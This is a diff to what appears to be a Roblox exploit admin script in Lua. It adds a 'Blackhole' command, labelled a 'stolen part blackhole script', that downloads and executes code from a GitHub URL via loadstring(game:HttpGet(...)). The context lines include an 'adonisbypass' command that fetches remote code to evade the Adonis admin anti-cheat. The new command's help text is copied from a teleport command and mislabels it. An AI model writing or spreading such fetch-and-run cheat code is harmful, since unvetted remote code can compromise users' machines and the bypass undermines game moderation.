@@ -1976,6 +1976,14 @@ cmd.add({"teleporttoplace","toplace","ttp"},{"teleporttoplace (PlaceId) (toplace
 	SafeGetService("TeleportService"):Teleport(pId)
 end)
 
+
+cmd.add({"Blackhole","bhole","bh"},{"teleporttoplace (PlaceId) (toplace,ttp)","stolen part blackhole script LMAO "},function(...)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureEpic/orion/refs/heads/main/bla"))()
+
+end)
+
+
+
 --fixed-viper
 cmd.add({"adonisbypass","bypassadonis","badonis","adonisb"},{"adonisbypass (bypassadonis,badonis,adonisb)","bypasses adonis admin detection"},function()
 	loadstring(game:HttpGet("https://github.com/ltseverydayyou/Nameless-Admin/blob/main/adonisbypass.lua?raw=true"))()
